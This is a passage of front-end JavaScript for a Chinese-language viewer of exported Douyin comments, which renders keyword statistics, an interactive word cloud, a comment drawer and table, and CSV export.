list) {\n      users.add(c.user.secUid || c.user.uid || c.user.nickname);\n      digg += c.digg;\n      if (c.digg >= 100) hot++;\n      if (!c.isReply) topLevel++;\n    }\n    const avg = list.length ? (digg / list.length) : 0;\n    const pct = (n) => (list.length ? Math.round(n / list.length * 100) : 0) + '%';\n    const cells = [\n      { k: '评论数', v: fmtNum(list.length), s: '条' },\n      { k: '参与用户', v: fmtNum(users.size), s: '人' },\n      { k: '关键词', v: fmtNum(state.words.length), s: '个' },\n      { k: '平均点赞', v: fmtNum(Math.round(avg * 10) / 10), s: '' },\n      { k: '高赞（≥100 赞）', v: fmtNum(hot), s: '条' },\n      { k: '一级评论', v: pct(topLevel), s: fmtNum(topLevel) + ' 条' },\n    ];\n    $('#kpis').innerHTML = cells.map((c) => `\n      <div class=\"kpi\">\n        <div class=\"k\">${esc(c.k)}</div>\n        <div class=\"v\">${esc(c.v)}<small>${esc(c.s || '')}</small></div>\n      </div>`).join('');\n  }\n\n  function updateScope() {\n    const el = $('#sourceInfo');\n    if (!state.comments.length) { el.textContent = '未载入数据'; return; }\n    const parts = [\n      `${state.videos.size} 个视频`,\n      `${fmtNum(state.comments.length)} 条评论`,\n      `${state.sources.length} 个文件`,\n    ];\n    el.textContent = parts.join(' · ') + (state.videos.size === 1 ? ' · 单条视频' : '');\n  }\n\n  // v2.9：加载骨架屏（读文件 / 解析 JSON 时先占位，避免白屏和跳动）\n  let skeletonBuilt = false;\n  let wordListStash = null;\n  function buildSkeletons() {\n    if (skeletonBuilt) return;\n    skeletonBuilt = true;\n    // v2.6：词云骨架改成几块「大块」铺在面板里（以前 18 条细碎小条看着乱）\n    const cloud = $('#skCloud');\n    if (cloud) {\n      const blocks = [{\"l\":6,\"t\":10,\"w\":11,\"h\":11},{\"l\":8,\"t\":26,\"w\":26,\"h\":30},{\"l\":37,\"t\":17,\"w\":30,\"h\":41},{\"l\":70,\"t\":23,\"w\":22,\"h\":27},{\"l\":16,\"t\":62,\"w\":18,\"h\":17},{\"l\":39,\"t\":66,\"w\":23,\"h\":15},{\"l\":66,\"t\":58,\"w\":25,\"h\":13},{\"l\":82,\"t\":74,\"w\":12,\"h\":14}];\n      cloud.innerHTML = blocks\n        .map((b, i) => `<i style=\"left:${b.l}%;top:${b.t}%;width:${b.w}%;height:${b.h}%;animation-delay:${(i * 0.08).toFixed(2)}s\"></i>`)\n        .join('');\n    }\n    const tb = $('#skTable');\n    if (tb) {\n      tb.innerHTML = Array.from({ length: 8 }, () =>\n        '<div class=\"sk-row\"><i style=\"width:44%\"></i><i style=\"width:12%\"></i><i style=\"width:6%\"></i><i style=\"width:6%\"></i><i style=\"width:8%\"></i></div>'\n      ).join('');\n    }\n  }\n  function setLoading(on) {\n    if (on) buildSkeletons();\n    document.body.classList.toggle('is-loading', !!on);\n    const c = $('#skCloud');\n    if (c) c.hidden = !on;\n    const t = $('#skTable');\n    if (t) t.hidden = !on;\n    const k = $('#kpis');\n    if (k) k.setAttribute('aria-busy', on ? 'true' : 'false');\n    const wl = $('#wordList');\n    if (wl) {\n      if (on) {\n        wordListStash = wl.innerHTML;\n        wl.innerHTML = '';\n        [72, 54, 64, 46, 58, 40, 50, 36].forEach((w) => {\n          const li = document.createElement('li');\n          li.className = 'sk-li';\n          li.innerHTML = '<i style=\"width:' + w + '%\"></i>';\n          wl.appendChild(li);\n        });\n        wl.scrollTop = 0;\n      } else {\n        wl.querySelectorAll('.sk-li').forEach((li) => li.remove());\n        if (wordListStash != null) {\n          wl.innerHTML = wordListStash;\n          wordListStash = null;\n        }\n      }\n    }\n  }\n\n  function updateEmptyState() {\n    const empty = state.comments.length === 0;\n    document.body.classList.toggle('is-empty', empty);\n    const el = $('#cloudEmpty');\n    if (el) el.classList.toggle('hidden', !empty);\n  }\n\n  /* ===================== 视频下拉 ===================== */\n  function renderVideoFilter() {\n    const sel = $('#videoFilter');\n    const cur = state.filters.videoId;\n    const counts = new Map();\n    for (const c of state.comments) counts.set(c.videoId, (counts.get(c.videoId) || 0) + 1);\n    const opts = ['<option value=\"\">全部视频（' + state.comments.length + ' 条评论）</option>'];\n    const list = Array.from(state.videos.values()).sort((a, b) => (counts.get(b.id) || 0) - (counts.get(a.id) || 0));\n    for (const v of list) {\n      const n = counts.get(v.id) || 0;\n      if (!n) continue;\n      const label = (v.title || ('视频 ' + String(v.id).slice(-8))) + `（${n} 条）`;\n      opts.push(`<option value=\"${esc(v.id)}\">${esc(label)}</option>`);\n    }\n    sel.innerHTML = opts.join('');\n    sel.value = cur;\n    // 「打开原视频 ↗」：选中某条视频时可用；只载入了一条视频时默认可用\n    const btn = $('#btnOpenVideo');\n    const onlyId = state.videos.size === 1 ? Array.from(state.videos.keys())[0] : '';\n    const target = cur || onlyId;\n    const meta = target ? (state.videos.get(target) || {}) : null;\n    btn.disabled = !target;\n    btn.dataset.videoId = target || '';\n    btn.title = target\n      ? '在新标签页打开抖音视频页：' + ((meta && meta.title) || target)\n      : '先在左侧选一条视频（或只载入一条视频）';\n  }\n\n  /* ===================== 词云布局 ===================== */\n  // 词云只用一支色阶：前 6 个高频词用强调色（数据色），其余两级中性灰。\n  function wordTier(rank) {\n    if (rank < 6) return { color: '#e0a94a', weight: 600 };\n    if (rank < 26) return { color: '#c2c2c7', weight: 500 };\n    return { color: '#8e8e94', weight: 400 };\n  }\n\n  function measureWord(word, fontSize, cloud) {\n    const span = document.createElement('span');\n    span.className = 'cw';\n    span.textContent = word;\n    span.style.position = 'absolute';\n    span.style.visibility = 'hidden';\n    span.style.whiteSpace = 'nowrap';\n    span.style.fontSize = fontSize + 'px';\n    span.style.fontWeight = '600';\n    span.style.letterSpacing = '0.5px';    cloud.appendChild(span);\n    const w = span.offsetWidth, h = span.offsetHeight;\n    cloud.removeChild(span);\n    return { w: Math.max(w, 8), h: Math.max(h, 8) };\n  }\n\n  function layoutCloud(words, cloud) {\n    const W = cloud.clientWidth, H = cloud.clientHeight;\n    if (!W || !H || !words.length) return [];\n    cloud.innerHTML = '';\n    const placed = [];\n    const pad = 6;\n    const maxWords = words.length;\n    const minCount = words[maxWords - 1] ? words[maxWords - 1].count : 1;\n    const maxCount = words[0] ? words[0].count : 1;\n    const maxFont = Math.max(24, Math.min(60, Math.round(Math.min(W, H) / 7.5)));\n    const minFont = 13;\n\n    const sizeOf = (c) => {\n      const t = maxCount === minCount ? 1 : (Math.sqrt(c) - Math.sqrt(minCount)) / (Math.sqrt(maxCount) - Math.sqrt(minCount));\n      return Math.round(minFont + (maxFont - minFont) * Math.max(0, Math.min(1, t)));\n    };\n\n    const cx = W / 2, cy = H / 2;\n    // 把阿基米德螺旋归一化到椭圆里，避免只用水平方向铺、留下上下一大片空白\n    const rx = Math.max(40, cx - pad), ry = Math.max(40, cy - pad);\n\n    for (let i = 0; i < maxWords; i++) {\n      const rec = words[i];\n      const fs = sizeOf(rec.count);\n      const m = measureWord(rec.word, fs, cloud);\n      if (m.w > W - pad * 2) continue;\n      let angle = (i % 2 === 0 ? 1 : -1) * 0.35;\n      let okRect = null;\n      for (let step = 0; step < 2600; step++) {\n        const sr = 0.055 * Math.pow(Math.max(angle, 0.001), 0.85);\n        const x = cx + Math.cos(angle) * sr * rx - m.w / 2;\n        const y = cy + Math.sin(angle) * sr * ry - m.h / 2;\n        const rect = { x, y, w: m.w, h: m.h };\n        if (x >= pad && y >= pad && x + m.w <= W - pad && y + m.h <= H - pad) {\n          let hit = false;\n          for (const p of placed) {\n            if (rect.x < p.x + p.w + 3 && rect.x + rect.w + 3 > p.x &&\n                rect.y < p.y + p.h + 2 && rect.y + rect.h + 2 > p.y) { hit = true; break; }\n          }\n          if (!hit) { okRect = rect; break; }\n        }\n        angle += 0.38;\n      }\n      if (!okRect) continue;\n      const span = document.createElement('span');\n      span.className = 'cw';\n      span.textContent = rec.word;\n      span.dataset.word = rec.word;\n      span.style.left = Math.round(okRect.x) + 'px';\n      span.style.top = Math.round(okRect.y) + 'px';\n      span.style.fontSize = fs + 'px';\n      const tier = wordTier(placed.length);\n      span.style.color = tier.color;\n      span.style.fontWeight = String(tier.weight);\n      cloud.appendChild(span);\n      placed.push(okRect);\n    }\n    return placed;\n  }\n\n  /* ===================== 词云交互 ===================== */\n  let hideTipTimer = null;\n\n  function wordSamples(rec, n) {\n    const out = [];\n    for (const c of state.comments) {\n      if (!c.text) continue;\n      if (rec.cids.has(c.cid) || (c.cid === '' && tokensOf(c.textClean || c.text).map(cleanToken).indexOf(rec.word) >= 0)) {\n        out.push(c);\n        if (out.length >= n) break;\n      }\n    }\n    return out;\n  }\n\n  function showTooltip(span, rec) {\n    // v2.1：先清掉「上一个词 mouseout 排下的隐藏定时器」，否则快速从一个词扫到另一个词时，\n    // 新弹框会在 180ms 后被旧定时器关掉——表现为「有时候悬停不弹框」。\n    clearTimeout(hideTipTimer);\n    hideTipTimer = null;\n    const tip = $('#tooltip');\n    const samples = wordSamples(rec, 2);\n    const userCount = rec.users ? rec.users.size : 0;\n    const items = samples.map((c) => {\n      const href = profileOf(c.user);\n      const tag = href ? 'a' : 'div';\n      const attrs = href ? ` href=\"${esc(href)}\" target=\"_blank\" rel=\"noopener noreferrer\"` : '';\n      const go = href ? ' · <span class=\"go\">点这里打开 TA 的主页 ↗</span>' : ' · <span class=\"go\">（该用户无主页信息）</span>';\n      return `<${tag} class=\"tt-item\"${attrs}>\n        <div class=\"tt-txt\">${esc(c.text || '（无文字）')}</div>\n        <div class=\"tt-user\">${esc(c.user.nickname)}${go}</div>\n      </${tag}>`;\n    }).join('');\n    tip.innerHTML = `\n      <div class=\"tt-word\">${esc(rec.word)}</div>\n      <div class=\"tt-meta\">出现 ${rec.count} 条评论 · ${userCount} 位用户说了这个词</div>\n      <div class=\"tt-comments\">${items || '<div class=\"muted small\">没有可展示的样例评论</div>'}</div>\n      <div class=\"tt-more\" data-act=\"open-drawer\">查看全部 ${rec.count} 条 →</div>`;\n    tip.classList.remove('hidden');\n    positionTooltip(span);\n    tip.onmouseenter = () => clearTimeout(hideTipTimer);\n    tip.onmouseleave = () => hideTooltip();\n    const more = tip.querySelector('[data-act=\"open-drawer\"]');\n    if (more) more.addEventListener('click', (e) => { e.stopPropagation(); openDrawer(rec.word); });\n  }\n\n  function positionTooltip(span) {\n    const tip = $('#tooltip');\n    const r = span.getBoundingClientRect();\n    const tw = tip.offsetWidth, th = tip.offsetHeight;\n    const gap = 12;\n    // 悬浮框本身可点（样例评论 → 主页），所以要尽量别盖住词：鼠标进不到词上就会出现\n    // 「悬停 A 却显示 B 的框」。做法：在词云面板内试上/下/左/右四个位置，取压住词面积最小的。\n    const cloudRect = $('#cloud').getBoundingClientRect();\n    const wordRects = $$('.cw', $('#cloud')).map((el) => el.getBoundingClientRect());\n    const overlapArea = (x, y) => {\n      let sum = 0;\n      for (const w of wordRects) {\n        const ox = Math.min(x + tw, w.right + 4) - Math.max(x, w.left - 4);\n        const oy = Math.min(y + th, w.bottom + 4) - Math.max(y, w.top - 4);\n        if (ox > 0 && oy > 0) sum += ox * oy;\n      }\n      return sum;\n    };\n    const inside = (x, y) => x >= cloudRect.left + 4 && y >= cloudRect.top + 4 &&\n      x + tw <= cloudRect.right - 4 && y + th <= cloudRect.bottom - 4;\n    const clampTo = (v, lo, hi) => Math.max(lo, Math.min(v, hi));\n    const loX = cloudRect.left + 6, hiX = cloudRect.right - tw - 6;\n    const loY = cloudRect.top + 6, hiY = cloudRect.bottom - th - 6;\n    const cands = [\n      { x: r.left + r.width / 2 - tw / 2, y: r.top - th - gap },        // 上\n      { x: r.left + r.width / 2 - tw / 2, y: r.bottom + gap },          // 下\n      { x: r.right + gap + 2, y: r.top + r.height / 2 - th / 2 },       // 右\n      { x: r.left - tw - gap - 2, y: r.top + r.height / 2 - th / 2 },   // 左\n    ].map((c) => ({\n      x: clampTo(Math.round(c.x), loX, Math.max(loX, hiX)),\n      y: clampTo(Math.round(c.y), loY, Math.max(loY, hiY)),\n    }));\n    let best = null, bestScore = Infinity;\n    for (const c of cands) {\n      // 越界（词云面板放不下）优先扣分；再按压住词的总面积排序\n      const score = overlapArea(c.x, c.y) + (inside(c.x, c.y) ? 0 : 1e9);\n      if (score < bestScore) { bestScore = score; best = c; }\n    }\n    if (!best) return;\n    tip.style.left = best.x + 'px';\n    tip.style.top = best.y + 'px';\n  }\n\n  function hideTooltip() {\n    clearTimeout(hideTipTimer);\n    hideTipTimer = setTimeout(() => { $('#tooltip').classList.add('hidden'); }, 180);\n  }\n\n  function bindCloudHover() {\n    const cloud = $('#cloud');\n\n    function activate(span) {\n      const rec = state.wordMap.get(span.dataset.word);\n      if (!rec) return;\n      if (state.hoverWord !== rec.word) {\n        state.hoverWord = rec.word;\n        $$('.cw', cloud).forEach((el) => {\n          if (el === span) { el.classList.add('hot'); el.classList.remove('dim'); }\n          else { el.classList.add('dim'); el.classList.remove('hot'); }\n        });\n      }\n      showTooltip(span, rec);\n    }\n\n    cloud.addEventListener('mouseover', (e) => {\n      const span = e.target.closest('.cw');\n      if (!span) return;\n      activate(span);\n    });\n    // 兜底：tooltip 是浮在词云上的可点面板，会挡住它下面的词，光靠 mouseover 就会出现\n    // 「悬停 A 却显示 B 的框 / 悬停了不弹」。这里在 document 上按鼠标坐标做几何命中，\n    // 即使指针落在 tooltip 上，只要下面有词就切到那个词。\n    function clearHighlight() {\n      $$('.cw', cloud).forEach((el) => { el.classList.remove('hot'); el.classList.remove('dim'); });\n      state.hoverWord = '';\n    }\n    let moveRaf = 0;\n    let lastPt = null;\n    document.addEventListener('mousemove', (e) => {\n      lastPt = { x: e.clientX, y: e.clientY };\n      // 指针在抽屉里（抽屉会盖住词云右半边）时不要再去命中它背后的词，\n      // 否则翻抽屉时词云会莫名其妙地高亮。\n      const inDrawer = e.target && e.target.closest ? !!e.target.closest('#drawer') : false;\n      if (inDrawer) {\n        if (state.hoverWord) clearHighlight();\n        return;\n      }\n      if (moveRaf) return;\n      moveRaf = requestAnimationFrame(() => {\n        moveRaf = 0;\n        if (!lastPt) return;\n        const p = lastPt;\n        const spans = $$('.cw', cloud);\n        let hit = null;\n        for (const el of spans) {\n          const r = el.getBoundingClientRect();\n          if (p.x >= r.left && p.x <= r.right && p.y >= r.top && p.y <= r.bottom) { hit = el; break; }\n        }\n        // 指针不在任何词上（空处 / 悬浮框上）就必须把高亮清掉。\n        // 否则从悬浮框里移出来时，那个词没有 mouseout 事件，会一直亮着、别的词一直变淡，\n        // 看起来就是「没悬浮在词上却高亮了」。\n        if (!hit) {\n          if (state.hoverWord) clearHighlight();\n          return;\n        }\n        const tip = $('#tooltip');\n        if (state.hoverWord === hit.dataset.word && !tip.classList.contains('hidden')) return;\n        activate(hit);\n      });\n    });\n    document.addEventListener('mouseleave', () => {\n      clearHighlight();\n      hideTooltip();\n    });\n    cloud.addEventListener('mouseout', (e) => {\n      const span = e.target.closest('.cw');\n      if (!span) return;\n      const to = e.relatedTarget && e.relatedTarget.closest ? e.relatedTarget.closest('.cw') : null;\n      if (to === span) return;\n      span.classList.remove('hot');\n      if (!to) {\n        $$('.cw', cloud).forEach((el) => el.classList.remove('dim'));\n        state.hoverWord = '';\n      }\n      hideTooltip();\n    });\n    cloud.addEventListener('click', (e) => {\n      const span = e.target.closest('.cw');\n      if (!span) return;\n      openDrawer(span.dataset.word);\n    });\n  }\n\n  /* ===================== 侧栏关键词 ===================== */\n  function renderWordList() {\n    const list = $('#wordList');\n    const top = state.words.slice(0, 30);\n    const max = top.length ? top[0].count : 1;\n    $('#wordInfo').textContent = state.words.length ? `${state.words.length} 个词 · 点击看评论` : '';\n    if (!top.length) {\n      list.innerHTML = '<li class=\"muted small\" style=\"display:block;cursor:default\">暂无关键词</li>';\n      return;\n    }\n    list.innerHTML = top.map((w, i) => `\n      <li data-word=\"${esc(w.word)}\">\n        <span class=\"rank\">${i + 1}</span>\n        <span class=\"w\" title=\"${esc(w.word)}\">${esc(w.word)}</span>\n        <span class=\"n\">${w.count}</span>\n      </li>`).join('');\n  }\n\n  /* ===================== 抽屉 ===================== */\n  const drawer = { word: '', list: [], shown: 0, pageStep: 20 };\n\n  function commentsWithWord(word) {\n    const out = [];\n    const rec = state.wordMap.get(word);\n    for (const c of filtered()) {\n      if (!c.text) continue;\n      const has = rec && c.cid ? rec.cids.has(c.cid) : tokensOf(c.textClean || c.text).map(cleanToken).indexOf(word) >= 0;\n      if (has) out.push(c);\n    }\n    out.sort((a, b) => b.digg - a.digg);\n    return out;\n  }\n\n  function openDrawer(word) {\n    const list = commentsWithWord(word);\n    drawer.word = word;\n    drawer.list = list;\n    drawer.shown = 0;\n    $('#drawerTitle').textContent = '「' + word + '」';\n    $('#drawerSub').textContent = `${list.length} 条评论包含这个词（按点赞降序）`;\n    $('#drawerBody').innerHTML = '';\n    $('#drawer').classList.remove('hidden');\n    $('#tooltip').classList.add('hidden');\n    renderDrawerMore();\n  }\n\n  function renderDrawerMore() {\n    const body = $('#drawerBody');\n    const next = drawer.list.slice(drawer.shown, drawer.shown + drawer.pageStep);\n    if (!drawer.shown && !drawer.list.length) {\n      body.innerHTML = '<div class=\"empty small\">没有找到包含这个词的评论</div>';\n    }\n    const frag = document.createElement('div');\n    frag.innerHTML = next.map((c) => {\n      const href = profileOf(c.user);\n      const go = href\n        ? `<a class=\"dc-go\" href=\"${esc(href)}\" target=\"_blank\" rel=\"noopener noreferrer\">打开主页 ↗</a>`\n        : '<span class=\"dc-go off\" title=\"导出数据里没有 sec_uid\">无主页信息</span>';\n      const badges = [\n        c.isHot ? '<span class=\"badge hot\">热评</span>' : '',\n        c.isReply ? '<span class=\"badge reply\">回复</span>' : '',\n        c.isFolded ? '<span class=\"badge fold\">折叠</span>' : '',\n      ].join('');\n      return `<div class=\"dc\">\n        <div class=\"dc-head\">\n          <div class=\"dc-user\">\n            <span class=\"avatar\" style=\"${esc(avatarStyle(c.user))}\">${esc(initials(c.user.nickname))}</span>\n            <div class=\"user-meta\">\n              <span class=\"user-name\">${esc(c.user.nickname)}</span>\n              <span class=\"user-sub\">${esc(c.user.uniqueId || (c.user.shortId ? 'ID ' + c.user.shortId : 'ID ' + String(c.user.uid || '').slice(-8)))}</span>\n            </div>\n          </div>\n          ${go}\n        </div>\n        <div class=\"dc-text\">${esc(c.text || '（无文字）')}</div>\n        <div class=\"dc-meta\">\n          <span>赞 ${fmtNum(c.digg)}</span>\n          <span>回复 ${fmtNum(c.replies)}</span>\n          ${c.ip ? `<span>属地 ${esc(c.ip)}</span>` : ''}\n          <span>${esc(c.createTimeStr || fmtTimeShort(c.createTime))}</span>\n          <span class=\"spacer\"></span>\n          ${badges}\n        </div>\n      </div>`;\n    }).join('');\n    while (frag.firstChild) body.appendChild(frag.firstChild);\n    drawer.shown += next.length;\n    const more = $('#btnDrawerMore');\n    more.disabled = drawer.shown >= drawer.list.length;\n    more.textContent = drawer.shown >= drawer.list.length\n      ? `已全部显示（${drawer.list.length} 条）`\n      : `加载更多（还有 ${drawer.list.length - drawer.shown} 条）`;\n  }\n\n  function closeDrawer() { $('#drawer').classList.add('hidden'); }\n\n  /* ===================== 表格 ===================== */\n  function sortList(list) {\n    const arr = list.slice();\n    const by = state.sort;\n    if (by === 'digg') arr.sort((a, b) => b.digg - a.digg || b.createTime - a.createTime);\n    else if (by === 'time') arr.sort((a, b) => b.createTime - a.createTime || b.digg - a.digg);\n    else if (by === 'len') arr.sort((a, b) => b.text.length - a.text.length || b.digg - a.digg);\n    else if (by === 'replies') arr.sort((a, b) => b.replies - a.replies || b.digg - a.digg);\n    return arr;\n  }\n\n  function highlight(text, q) {\n    if (!q) return esc(text);\n    const lower = text.toLowerCase();\n    let idx = lower.indexOf(q);\n    if (idx === -1) return esc(text);\n    let out = '', i = 0;\n    while (idx !== -1) {\n      out += esc(text.slice(i, idx)) + '<span class=\"hl\">' + esc(text.slice(idx, idx + q.length)) + '</span>';\n      i = idx + q.length;\n      idx = lower.indexOf(q, i);\n    }\n    out += esc(text.slice(i));\n    return out;\n  }\n\n  function renderTable() {\n    const list = sortList(filtered());\n    const total = list.length;\n    const pages = Math.max(1, Math.ceil(total / state.pageSize));\n    if (state.page > pages) state.page = pages;\n    const start = (state.page - 1) * state.pageSize;\n    const rows = list.slice(start, start + state.pageSize);\n    const q = state.filters.search.trim().toLowerCase();\n    const tbody = $('#tbody');\n    tbody.innerHTML = rows.map((c) => {\n      const href = profileOf(c.user);\n      const nameHtml = highlight(c.user.nickname, q);\n      const userCell = `<div class=\"user-cell\">\n        <span class=\"avatar\" style=\"${esc(avatarStyle(c.user))}\">${esc(initials(c.user.nickname))}</span>\n        <div class=\"user-meta\">\n          ${href ? `<a class=\"user-name\" href=\"${esc(href)}\" target=\"_blank\" rel=\"noopener noreferrer\" title=\"打开抖音主页\">${nameHtml}</a>`\n                 : `<span class=\"user-name nolink\" title=\"导出数据里没有 sec_uid，无法拼主页\">${nameHtml}</span>`}\n          <span class=\"user-sub\">${esc(c.user.uniqueId || (c.user.shortId ? 'ID ' + c.user.shortId : ''))}</span>\n        </div>\n      </div>`;\n      const badges = `<span class=\"badges\">\n        ${c.isHot ? '<span class=\"badge hot\">热</span>' : ''}\n        ${c.isReply ? '<span class=\"badge reply\">回复</span>' : ''}\n        ${c.isFolded ? '<span class=\"badge fold\">折叠</span>' : ''}\n      </span>`;\n      return `<tr>\n        <td><div class=\"txt\">${highlight(c.text || '（无文字）', q)}${badges}</div>\n          ${c.videoTitle && !state.filters.videoId ? `<div class=\"muted small\" style=\"margin-top:4px\"><a class=\"video-link\" href=\"${esc(videoUrl(c.videoId))}\" target=\"_blank\" rel=\"noopener noreferrer\" title=\"在原视频页打开这条视频\">${esc(c.videoTitle)} ↗</a></div>` : ''}\n        </td>\n        <td>${userCell}</td>\n        <td class=\"num\">${fmtNum(c.digg)}</td>\n        <td class=\"num\">${fmtNum(c.replies)}</td>\n        <td class=\"muted\">${esc(c.ip || '-')}</td>\n        <td class=\"muted small\">${esc(c.createTimeStr ? c.createTimeStr.slice(0, 16) : fmtTime(c.createTime))}</td>\n        <td class=\"muted small\">${c.isReply ? '二级' : '一级'}</td>\n      </tr>`;\n    }).join('');\n    $('#tableEmpty').classList.toggle('hidden', rows.length > 0);\n    $('#tableCount').textContent = `（${total} 条${state.filters.search ? '，含搜索「' + state.filters.search + '」' : ''}）`;\n    $('#btnExport').disabled = total === 0;\n    renderPager(pages, total);\n  }\n\n  function renderPager(pages, total) {\n    const pager = $('#pager');\n    const cur = state.page;\n    const btns = [];\n    btns.push(`<button type=\"button\" data-page=\"1\" ${cur === 1 ? 'disabled' : ''}>« 首页</button>`);\n    btns.push(`<button type=\"button\" data-page=\"${cur - 1}\" ${cur === 1 ? 'disabled' : ''}>‹ 上一页</button>`);\n    const from = Math.max(1, cur - 3), to = Math.min(pages, from + 6);\n    for (let p = from; p <= to; p++) {\n      btns.push(`<button type=\"button\" data-page=\"${p}\" class=\"${p === cur ? 'on' : ''}\">${p}</button>`);\n    }\n    btns.push(`<button type=\"button\" data-page=\"${cur + 1}\" ${cur === pages ? 'disabled' : ''}>下一页 ›</button>`);\n    btns.push(`<button type=\"button\" data-page=\"${pages}\" ${cur === pages ? 'disabled' : ''}>末页 »</button>`);\n    pager.innerHTML = btns.join('') + `<span class=\"info\">第 ${cur} / ${pages} 页 · 共 ${total} 条</span>`;\n  }\n\n  /* ===================== 导出 ===================== */\n  function csvCell(v) {\n    const s = String(v == null ? '' : v);\n    return /[\",\\r\\n]/.test(s) ? '\"' + s.replace(/\"/g, '\"\"') + '\"' : s;\n  }\n\n  const EXPORT_LABELS = ['评论ID', '视频ID', '视频标题', '评论内容', '用户昵称', '抖音号', 'sec_uid', '点赞数', '回复数', '属地', '发布时间', '层级'];\n\n  function exportFilteredCsv() {\n    const list = sortList(filtered());\n    if (!list.length) { toast('没有可导出的评论'); return; }\n    const rows = [EXPORT_LABELS.slice(1).join(',')];\n    rows.push(['# ' + EXPORT_LABELS[0]].concat(EXPORT_LABELS.slice(1)).join(','));\n    for (const c of list) {\n      rows.push([\n        csvCell(c.cid), csvCell(c.videoId), csvCell(c.videoTitle), csvCell(c.text),\n        csvCell(c.user.nickname), csvCell(c.user.uniqueId), csvCell(c.user.secUid),\n        csvCell(c.digg), csvCell(c.replies), csvCell(c.ip), csvCell(c.createTimeStr || fmtTime(c.createTime)),\n        csvCell(c.isReply ? 2 : 1),\n      ].join(','));\n    }\n    const blob = new Blob(['\\uFEFF' + rows.join('\\r\\n') + '\\r\\n'], { type: 'text/csv;charset=utf-8' });\n    const a = document.createElement('a');\n    a.href = URL.createObjectURL(blob);\n    a.download = 'comments-view-' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-') + '.csv';\n    document.body.appendChild(a);\n    a.click();\n    setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 1500);\n    toast(`已导出 ${list.length} 条评论`);\n  }\n\n  /* ===================== 刷新 ===================== */\n  function recomputeWords(list) {\n    state.words = buildWords(list);\n    state.wordMap = new Map(state.words.map((w) => [w.word, w]));\n  }\n\n  let layoutSeq = 0;\n  function renderCloud() {\n    const cloud = $('#cloud');\n    if (!state.comments.length) { cloud.innerHTML = ''; return; }\n    const size = Number($('#cloudSize').value) || 120;\n    const words = state.words.slice(0, size).filter((w) => w.count >= 2 || state.words.length < 40);\n    const use = words.length ? words : state.words.slice(0, size);\n    const seq = ++layoutSeq;\n    // 等一帧，保证 cloud 已按最新尺寸布局\n    requestAnimationFrame(() => {\n      if (seq !== layoutSeq) return;\n      layoutCloud(use, cloud);\n      state.cloudReady = true;\n    });\n  }\n\n  function refreshAll() {\n    const list = filtered();\n    recomputeWords(list);\n    renderKpis(list);\n    renderVideoFilter();\n    renderWordList();\n    renderCloud();\n    $('#cloudSub').textContent = state.words.length\n      ? `${state.words.length} 个词 · ${fmtNum(list.length)} 条评论`\n      : '';\n    state.page = 1;\n    renderTable();\n  }\n\n  /* ===================== 事件绑定 ===================== */\n  function bindEvents() {\n    $('#btnOpenFiles').addEventListener('click', () => $('#fileInput').click());\n    const btnOpenFiles2 = $('#btnOpenFiles2');\n    if (btnOpenFiles2) btnOpenFiles2.addEventListener('click', () => $('#fileInput').click());\n    $('#btnOpenDir').addEventListener('click', () => $('#dirInput').click());\n    $('#fileInput').addEventListener('change', (e) => { loadFiles(e.target.files); e.target.value = ''; });\n    $('#dirInput').addEventListener('change', (e) => { loadFiles(e.target.files); e.target.value = ''; });\n\n    $('#btnClear').addEventListener('click', () => {\n      state.comments = [];\n      state.videos = new Map();\n      state.sources = [];\n      state.words = [];\n      state.wordMap = new Map();\n      state.page = 1;\n      state.filters.videoId = '';\n      state.filters.search = '';\n      $('#search').value = '';\n      updateEmptyState();\n      updateScope();\n      refreshAll();\n      $('#btnClear').disabled = true;\n      $('#cloudEmpty').classList.remove('hidden');\n      $('#tableEmpty').classList.remove('hidden');\n      $('#videoFilter').innerHTML = '';\n      $('#btnOpenVideo').disabled = true;\n      $('#btnOpenVideo').dataset.videoId = '';\n      closeDrawer();\n      toast('已清空');\n    });\n\n    $('#cloudSize').addEventListener('change', () => { renderCloud(); });\n    $('#btnRelayout').addEventListener('click', () => { renderCloud(); toast('已重新排布'); });\n\n    // 「打开原视频 ↗」：新标签页打开当前选中视频的抖音页面\n    $('#btnOpenVideo').addEventListener('click', () => {\n      const btn = $('#btnOpenVideo');\n      const id = btn.dataset.videoId || state.filters.videoId;\n      const url = videoUrl(id);\n      if (!url) { toast('先选择一条视频'); return; }\n      window.open(url, '_blank', 'noopener');\n    });\n\n    $('#wordList').addEventListener('click', (e) => {\n      const li = e.target.closest('li[data-word]');\n      if (!li) return;\n      openDrawer(li.dataset.word);\n    });\n\n    $('#videoFilter').addEventListener('change', (e) => {\n      state.filters.videoId = e.target.value;\n      refreshAll();\n    });\n    ['onlyHasProfile', 'onlyTopLevel', 'onlyNonEmpty'].forEach((id) => {\n      $('#' + id).addEventListener('change', (e) => {\n        state.filters[id] = e.target.checked;\n        refreshAll();\n      });\n    });\n\n    const onSearch = debounce(() => {\n      state.filters.search = $('#search').value;\n      state.page = 1;\n      renderTable();\n    }, 200);\n    $('#search').addEventListener('input', onSearch);\n\n    $('#sortBy').addEventListener('change', (e) => {\n      state.sort = e.target.value;\n      state.page = 1;\n      renderTable();\n    });\n\n    $('#pager').addEventListener('click', (e) => {\n      const btn = e.target.closest('button[data-page]');\n      if (!btn) return;\n      state.page = Number(btn.dataset.page) || 1;\n      renderTable();\n      document.querySelector('.table-panel').scrollIntoView({ behavior: 'smooth', block: 'start' });\n    });\n\n    $('#btnExport').addEventListener('click', exportFilteredCsv);\n\n    $('#btnCloseDrawer').addEventListener('click', closeDrawer);\n    $('#btnDrawerMore').addEventListener('click', renderDrawerMore);\n    $('#btnDrawerFilter').addEventListener('click', () => {\n      const w = drawer.word;\n      if (!w) return;\n      $('#search').value = w;\n      state.filters.search = w;\n      state.page = 1;\n      closeDrawer();\n      renderTable();\n      document.querySelector('.table-panel').scrollIntoView({ behavior: 'smooth', block: 'start' });\n      toast('已在评论表里筛选「' + w + '」');\n    });\n\n    window.addEventListener('resize', debounce(() => {\n      if (!state.comments.length) return;\n      renderCloud();\n    }, 260));\n\n    // 拖拽文件到页面\n    document.addEventListener('dragover', (e) => { e.preventDefault(); });\n    document.addEventListener('drop', (e) => {\n      e.preventDefault();\n      if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files.length) loadFiles(e.dataTransfer.files);\n    });\n\n    window.addEventListener('keydown', (e) => {\n      if (e.key === 'Escape') {\n        closeDrawer();\n        $('#tooltip').classList.add('hidden');\n      }\n    });\n\n    bindCloudHover();\n  }\n\n  /* ===================== 启动 ===================== */\n  // 单文件快照（插件「导出词云」生成的自包含 